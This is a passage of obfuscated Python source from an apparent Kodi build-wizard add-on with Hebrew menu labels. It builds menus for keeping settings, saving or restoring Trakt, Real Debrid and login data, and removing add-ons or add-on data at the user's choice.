	OOO0000OOOO0000O0 ='true'if KEEPSOUND =='true'else 'false'#line:3451
	OO0000O00O00O0O0O ='true'if KEEPVIEW =='true'else 'false'#line:3452
	O00000OO0O0OOO00O ='true'if KEEPSKIN =='true'else 'false'#line:3453
	O00000000OOO00O00 ='true'if KEEPSKIN2 =='true'else 'false'#line:3454
	O00OO0OOOO0OO00OO ='true'if KEEPSKIN3 =='true'else 'false'#line:3455
	OO0OOO00O0O0OOOOO ='true'if KEEPADDONS =='true'else 'false'#line:3456
	O0OO0O0O0OO0OO0O0 ='true'if KEEPPVR =='true'else 'false'#line:3457
	OO00O0OO000OOO00O ='true'if KEEPTVLIST =='true'else 'false'#line:3458
	OOO0O00O000OOOO00 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3459
	OO0OOO000O0O0OOOO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3460
	O0O0OOOOO000O0000 ='true'if KEEPHUBTV =='true'else 'false'#line:3461
	OOOOO0O0O000O0000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3462
	OO00O0O00OOO00O00 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3463
	OO0O00OOO00OO0O00 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3464
	O0OOO0OO0O0OO00OO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3465
	O0O0OOOOO0000OOOO ='true'if KEEPHUBMENU =='true'else 'false'#line:3466
	O00OO0O000O00000O ='true'if KEEPPLAYLIST =='true'else 'false'#line:3467
	OO0OO0O0000O00000 ='true'if KEEPTRAKT =='true'else 'false'#line:3468
	OO0O00OO0O0O00O00 ='true'if KEEPREAL =='true'else 'false'#line:3469
	OOOOOOOO0000000OO ='true'if KEEPRD2 =='true'else 'false'#line:3470
	OOOO00OO0OOO0OOOO ='true'if KEEPTORNET =='true'else 'true'#line:3471
	OO000O00O0O000O00 ='true'if KEEPLOGIN =='true'else 'false'#line:3472
	OO00000OOOO0OO000 ='true'if KEEPSOURCES =='true'else 'false'#line:3473
	O0O0OOOO000O000O0 ='true'if KEEPADVANCED =='true'else 'false'#line:3474
	O0O0OO000OOO000O0 ='true'if KEEPPROFILES =='true'else 'false'#line:3475
	OO00O00O00OO00O00 ='true'if KEEPFAVS =='true'else 'false'#line:3476
	O0OOOO000O00OO000 ='true'if KEEPREPOS =='true'else 'false'#line:3477
	O0O0OOO0000OOO0OO ='true'if KEEPSUPER =='true'else 'false'#line:3478
	O0OOO0OOOOO00OOO0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3479
	O0000OOO000O00O00 ='true'if KEEPWEATHER =='true'else 'false'#line:3480
	O0OOOO0000O0OOO00 ='true'if KEEPVICTORY =='true'else 'false'#line:3481
	O0O0000OOO0O00OO0 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3482
	if O0OOO0OOOOO00OOO0 =='true':#line:3484
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3485
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3486
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3487
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3488
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3489
	addFile ('%s שמירת חשבון RD:  '%OO0O00OO0O0O00O00 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3492
	addFile ('%s שמירת חשבון טראקט:  '%OO0OO0O0000O00000 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3493
	addFile ('%s שמירת מועדפים:  '%OO00O00O00OO00O00 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3496
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0OO0O0O0OO0OO0O0 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3497
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0OOOO0000O0OOO00 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3498
	addFile ('%s שמירת חשבון טלמדיה:  '%O0O0000OOO0O00OO0 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3499
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO00O0OO000OOO00O .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3500
	addFile ('%s שמירת אריח סרטים:  '%OOO0O00O000OOOO00 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3501
	addFile ('%s שמירת אריח סדרות:  '%OO0OOO000O0O0OOOO .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3502
	addFile ('%s שמירת אריח טלויזיה:  '%O0O0OOOOO000O0000 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3503
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OOOOO0O0O000O0000 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3504
	addFile ('%s שמירת אריח ספורט:  '%OO00O0O00OOO00O00 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3505
	addFile ('%s שמירת אריח ילדים:  '%OO0O00OOO00OO0O00 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3506
	addFile ('%s שמירת אריח מוסיקה:  '%O0OOO0OO0O0OO00OO .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3507
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O0O0OOOOO0000OOOO .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3508
	addFile ('%s שמירת כל האריחים בסקין:  '%O00000OO0O0OOO00O .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3509
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0000OOO000O00O00 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3510
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OO0OOO00O0O0OOOOO .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3516
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0O0000OOO0OOOOOO .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3517
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O0O0000OOOOO0OO00 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3520
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OO00000OOOO0OO000 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3521
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OOO0000OOOO0000O0 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3522
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO0000O00O00O0O0O .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3524
	addFile ('%s שמירת פליליסט לאודר:  '%O00OO0O000O00000O .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3525
	addFile ('%s שמירת הגדרות באפר: '%O0O0OOOO000O000O0 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3530
	addFile ('%s שמירת רשימות ריפו:  '%O0OOOO000O00OO000 .replace ('true',OO0O0O0O00OO0000O ).replace ('false',OO0O000O0OO000000 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3532
	setView ('files','viewType')#line:3534
def traktMenu ():#line:3536
	O00OOOOO0O00O0000 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3537
	OO00O0OO0000O0OOO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3538
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3539
	addFile ('Save Trakt Data: %s'%O00OOOOO0O00O0000 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3540
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO00O0OO0000O0OOO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3541
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3542
	for O00OOOOO0O00O0000 in traktit .ORDER :#line:3544
		O0O000O00O0O0OO00 =TRAKTID [O00OOOOO0O00O0000 ]['name']#line:3545
		O0O0OOO0O0OO0OOOO =TRAKTID [O00OOOOO0O00O0000 ]['path']#line:3546
		OOO0O00OO000OO0O0 =TRAKTID [O00OOOOO0O00O0000 ]['saved']#line:3547
		OOOOO000O0OO00000 =TRAKTID [O00OOOOO0O00O0000 ]['file']#line:3548
		O0OO0OOO0OOO0000O =wiz .getS (OOO0O00OO000OO0O0 )#line:3549
		OO0OOOO0O0000O0OO =traktit .traktUser (O00OOOOO0O00O0000 )#line:3550
		OO0O0O00OOO00O0OO =TRAKTID [O00OOOOO0O00O0000 ]['icon']if os .path .exists (O0O0OOO0O0OO0OOOO )else ICONTRAKT #line:3551
		OOO0OOOOO000O0O00 =TRAKTID [O00OOOOO0O00O0000 ]['fanart']if os .path .exists (O0O0OOO0O0OO0OOOO )else FANART #line:3552
		O00O0O0000O0000OO =createMenu ('saveaddon','Trakt',O00OOOOO0O00O0000 )#line:3553
		O0OO0O0OO00O00O0O =createMenu ('save','Trakt',O00OOOOO0O00O0000 )#line:3554
		O00O0O0000O0000OO .append ((THEME2 %'%s Settings'%O0O000O00O0O0OO00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00OOOOO0O00O0000 )))#line:3555
		addFile ('[+]-> %s'%O0O000O00O0O0OO00 ,'',icon =OO0O0O00OOO00O0OO ,fanart =OOO0OOOOO000O0O00 ,themeit =THEME3 )#line:3557
		if not os .path .exists (O0O0OOO0O0OO0OOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0O0O00OOO00O0OO ,fanart =OOO0OOOOO000O0O00 ,menu =O00O0O0000O0000OO )#line:3558
		elif not OO0OOOO0O0000O0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00OOOOO0O00O0000 ,icon =OO0O0O00OOO00O0OO ,fanart =OOO0OOOOO000O0O00 ,menu =O00O0O0000O0000OO )#line:3559
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOOO0O0000O0OO ,'authtrakt',O00OOOOO0O00O0000 ,icon =OO0O0O00OOO00O0OO ,fanart =OOO0OOOOO000O0O00 ,menu =O00O0O0000O0000OO )#line:3560
		if O0OO0OOO0OOO0000O =="":#line:3561
			if os .path .exists (OOOOO000O0OO00000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00OOOOO0O00O0000 ,icon =OO0O0O00OOO00O0OO ,fanart =OOO0OOOOO000O0O00 ,menu =O0OO0O0OO00O00O0O )#line:3562
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00OOOOO0O00O0000 ,icon =OO0O0O00OOO00O0OO ,fanart =OOO0OOOOO000O0O00 ,menu =O0OO0O0OO00O00O0O )#line:3563
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OO0OOO0OOO0000O ,'',icon =OO0O0O00OOO00O0OO ,fanart =OOO0OOOOO000O0O00 ,menu =O0OO0O0OO00O00O0O )#line:3564
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3566
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3567
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3568
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3569
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3570
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3571
	setView ('files','viewType')#line:3572
def realMenu ():#line:3574
	OO00OOOOO0O000O00 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3575
	O00O00O00O00OOOO0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3576
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3577
	addFile ('Save Real Debrid Data: %s'%OO00OOOOO0O000O00 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3578
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O00O00O00O00OOOO0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3579
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3580
	for O00OO0OOO0OO000OO in debridit .ORDER :#line:3582
		OOOO0OOOOOO00000O =DEBRIDID [O00OO0OOO0OO000OO ]['name']#line:3583
		O0O0OOOOO000O0OOO =DEBRIDID [O00OO0OOO0OO000OO ]['path']#line:3584
		OOOO000O0O0OO0O0O =DEBRIDID [O00OO0OOO0OO000OO ]['saved']#line:3585
		O00OO000OO0O00OO0 =DEBRIDID [O00OO0OOO0OO000OO ]['file']#line:3586
		OOO000000O00O000O =wiz .getS (OOOO000O0O0OO0O0O )#line:3587
		OO0OO0O0OO000OO00 =debridit .debridUser (O00OO0OOO0OO000OO )#line:3588
		OO0OOO00O000000O0 =DEBRIDID [O00OO0OOO0OO000OO ]['icon']if os .path .exists (O0O0OOOOO000O0OOO )else ICONREAL #line:3589
		OOOO00OO00OO0OO0O =DEBRIDID [O00OO0OOO0OO000OO ]['fanart']if os .path .exists (O0O0OOOOO000O0OOO )else FANART #line:3590
		OO000000OOOO0OO00 =createMenu ('saveaddon','Debrid',O00OO0OOO0OO000OO )#line:3591
		O0O0OO0O00000O000 =createMenu ('save','Debrid',O00OO0OOO0OO000OO )#line:3592
		OO000000OOOO0OO00 .append ((THEME2 %'%s Settings'%OOOO0OOOOOO00000O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O00OO0OOO0OO000OO )))#line:3593
		addFile ('[+]-> %s'%OOOO0OOOOOO00000O ,'',icon =OO0OOO00O000000O0 ,fanart =OOOO00OO00OO0OO0O ,themeit =THEME3 )#line:3595
		if not os .path .exists (O0O0OOOOO000O0OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0OOO00O000000O0 ,fanart =OOOO00OO00OO0OO0O ,menu =OO000000OOOO0OO00 )#line:3596
		elif not OO0OO0O0OO000OO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O00OO0OOO0OO000OO ,icon =OO0OOO00O000000O0 ,fanart =OOOO00OO00OO0OO0O ,menu =OO000000OOOO0OO00 )#line:3597
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OO0O0OO000OO00 ,'authdebrid',O00OO0OOO0OO000OO ,icon =OO0OOO00O000000O0 ,fanart =OOOO00OO00OO0OO0O ,menu =OO000000OOOO0OO00 )#line:3598
		if OOO000000O00O000O =="":#line:3599
			if os .path .exists (O00OO000OO0O00OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O00OO0OOO0OO000OO ,icon =OO0OOO00O000000O0 ,fanart =OOOO00OO00OO0OO0O ,menu =O0O0OO0O00000O000 )#line:3600
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O00OO0OOO0OO000OO ,icon =OO0OOO00O000000O0 ,fanart =OOOO00OO00OO0OO0O ,menu =O0O0OO0O00000O000 )#line:3601
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO000000O00O000O ,'',icon =OO0OOO00O000000O0 ,fanart =OOOO00OO00OO0OO0O ,menu =O0O0OO0O00000O000 )#line:3602
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3604
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3605
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3606
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3607
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3608
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3609
	setView ('files','viewType')#line:3610
def loginMenu ():#line:3612
	O0OO0O000O0O0OO0O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3613
	OOO0O00O0O0000000 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3614
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3615
	addFile ('Save Login Data: %s'%O0OO0O000O0O0OO0O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3616
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOO0O00O0O0000000 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3617
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3618
	for O0OO0O000O0O0OO0O in loginit .ORDER :#line:3620
		O0000O000O0O00O0O =LOGINID [O0OO0O000O0O0OO0O ]['name']#line:3621
		O00O0OO000O0OOO00 =LOGINID [O0OO0O000O0O0OO0O ]['path']#line:3622
		O0OO0O00O0O0O0OO0 =LOGINID [O0OO0O000O0O0OO0O ]['saved']#line:3623
		O00OO0OOO0OOOOOO0 =LOGINID [O0OO0O000O0O0OO0O ]['file']#line:3624
		O0000O0O0O0OO0000 =wiz .getS (O0OO0O00O0O0O0OO0 )#line:3625
		O0O00000O0000OOOO =loginit .loginUser (O0OO0O000O0O0OO0O )#line:3626
		OOOO0O00000OO00O0 =LOGINID [O0OO0O000O0O0OO0O ]['icon']if os .path .exists (O00O0OO000O0OOO00 )else ICONLOGIN #line:3627
		O00O000OO0O000O0O =LOGINID [O0OO0O000O0O0OO0O ]['fanart']if os .path .exists (O00O0OO000O0OOO00 )else FANART #line:3628
		O0OOO000O0OOO0O0O =createMenu ('saveaddon','Login',O0OO0O000O0O0OO0O )#line:3629
		OO00OO00OOO00O000 =createMenu ('save','Login',O0OO0O000O0O0OO0O )#line:3630
		O0OOO000O0OOO0O0O .append ((THEME2 %'%s Settings'%O0000O000O0O00O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0OO0O000O0O0OO0O )))#line:3631
		addFile ('[+]-> %s'%O0000O000O0O00O0O ,'',icon =OOOO0O00000OO00O0 ,fanart =O00O000OO0O000O0O ,themeit =THEME3 )#line:3633
		if not os .path .exists (O00O0OO000O0OOO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO0O00000OO00O0 ,fanart =O00O000OO0O000O0O ,menu =O0OOO000O0OOO0O0O )#line:3634
		elif not O0O00000O0000OOOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0OO0O000O0O0OO0O ,icon =OOOO0O00000OO00O0 ,fanart =O00O000OO0O000O0O ,menu =O0OOO000O0OOO0O0O )#line:3635
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00000O0000OOOO ,'authlogin',O0OO0O000O0O0OO0O ,icon =OOOO0O00000OO00O0 ,fanart =O00O000OO0O000O0O ,menu =O0OOO000O0OOO0O0O )#line:3636
		if O0000O0O0O0OO0000 =="":#line:3637
			if os .path .exists (O00OO0OOO0OOOOOO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0OO0O000O0O0OO0O ,icon =OOOO0O00000OO00O0 ,fanart =O00O000OO0O000O0O ,menu =OO00OO00OOO00O000 )#line:3638
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0OO0O000O0O0OO0O ,icon =OOOO0O00000OO00O0 ,fanart =O00O000OO0O000O0O ,menu =OO00OO00OOO00O000 )#line:3639
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0000O0O0O0OO0000 ,'',icon =OOOO0O00000OO00O0 ,fanart =O00O000OO0O000O0O ,menu =OO00OO00OOO00O000 )#line:3640
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3642
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3643
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3644
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3645
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3646
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3647
	setView ('files','viewType')#line:3648
def fixUpdate ():#line:3650
	if KODIV <17 :#line:3651
		OOO0OO0OO0O0OO000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3652
		try :#line:3653
			os .remove (OOO0OO0OO0O0OO000 )#line:3654
		except Exception as O0OO0OOOO0O00O000 :#line:3655
			wiz .log ("Unable to remove %s, Purging DB"%OOO0OO0OO0O0OO000 )#line:3656
			wiz .purgeDb (OOO0OO0OO0O0OO000 )#line:3657
	else :#line:3658
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3659
def removeAddonMenu ():#line:3661
	OOOOO0O00OO0O0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3662
	OO0OO00OOOOO0O000 =[];O0OOOOOO000OO0OO0 =[]#line:3663
	for O0OOO0000OOO0O0OO in sorted (OOOOO0O00OO0O0OOO ,key =lambda OOO0OOO0OOOO0OOOO :OOO0OOO0OOOO0OOOO ):#line:3664
		O0OOO000O0O0O0000 =os .path .split (O0OOO0000OOO0O0OO [:-1 ])[1 ]#line:3665
		if O0OOO000O0O0O0000 in EXCLUDES :continue #line:3666
		elif O0OOO000O0O0O0000 in DEFAULTPLUGINS :continue #line:3667
		elif O0OOO000O0O0O0000 =='packages':continue #line:3668
		O000O000O0O0OOOO0 =os .path .join (O0OOO0000OOO0O0OO ,'addon.xml')#line:3669
		if os .path .exists (O000O000O0O0OOOO0 ):#line:3670
			O00OOOO0OO00OO00O =open (O000O000O0O0OOOO0 )#line:3671
			OOOOO0OOOO0O00OOO =O00OOOO0OO00OO00O .read ()#line:3672
			OOOO0OOOO0O00O0O0 =wiz .parseDOM (OOOOO0OOOO0O00OOO ,'addon',ret ='id')#line:3673
			O00OO0O0OO000O0OO =O0OOO000O0O0O0000 if len (OOOO0OOOO0O00O0O0 )==0 else OOOO0OOOO0O00O0O0 [0 ]#line:3675
			try :#line:3676
				OOO000O0O0OOOO0O0 =xbmcaddon .Addon (id =O00OO0O0OO000O0OO )#line:3677
				OO0OO00OOOOO0O000 .append (OOO000O0O0OOOO0O0 .getAddonInfo ('name'))#line:3678
				O0OOOOOO000OO0OO0 .append (O00OO0O0OO000O0OO )#line:3679
			except :#line:3680
				pass #line:3681
	if len (OO0OO00OOOOO0O000 )==0 :#line:3682
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3683
		return #line:3684
	if KODIV >16 :#line:3685
		O0OO000OOOOOO0OOO =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0OO00OOOOO0O000 )#line:3686
	else :#line:3687
		O0OO000OOOOOO0OOO =[];OOOOO00OOOOO0OO00 =0 #line:3688
		OO0O00O0000OOO000 =["-- Click here to Continue --"]+OO0OO00OOOOO0O000 #line:3689
		while not OOOOO00OOOOO0OO00 ==-1 :#line:3690
			OOOOO00OOOOO0OO00 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0O00O0000OOO000 )#line:3691
			if OOOOO00OOOOO0OO00 ==-1 :break #line:3692
			elif OOOOO00OOOOO0OO00 ==0 :break #line:3693
			else :#line:3694
				OO0O000000OOOOO0O =(OOOOO00OOOOO0OO00 -1 )#line:3695
				if OO0O000000OOOOO0O in O0OO000OOOOOO0OOO :#line:3696
					O0OO000OOOOOO0OOO .remove (OO0O000000OOOOO0O )#line:3697
					OO0O00O0000OOO000 [OOOOO00OOOOO0OO00 ]=OO0OO00OOOOO0O000 [OO0O000000OOOOO0O ]#line:3698
				else :#line:3699
					O0OO000OOOOOO0OOO .append (OO0O000000OOOOO0O )#line:3700
					OO0O00O0000OOO000 [OOOOO00OOOOO0OO00 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0OO00OOOOO0O000 [OO0O000000OOOOO0O ])#line:3701
	if O0OO000OOOOOO0OOO ==None :return #line:3702
	if len (O0OO000OOOOOO0OOO )>0 :#line:3703
		wiz .addonUpdates ('set')#line:3704
		for O0O0000O000O0OO0O in O0OO000OOOOOO0OOO :#line:3705
			removeAddon (O0OOOOOO000OO0OO0 [O0O0000O000O0OO0O ],OO0OO00OOOOO0O000 [O0O0000O000O0OO0O ],True )#line:3706
		xbmc .sleep (1000 )#line:3708
		if INSTALLMETHOD ==1 :O000O000O0O0000O0 =1 #line:3710
		elif INSTALLMETHOD ==2 :O000O000O0O0000O0 =0 #line:3711
		else :O000O000O0O0000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3712
		if O000O000O0O0000O0 ==1 :wiz .reloadFix ('remove addon')#line:3713
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3714
def removeAddonDataMenu ():#line:3716
	if os .path .exists (ADDOND ):#line:3717
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3718
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3719
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3720
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3721
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3722
		OOO0O00OOOOO0OOOO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3723
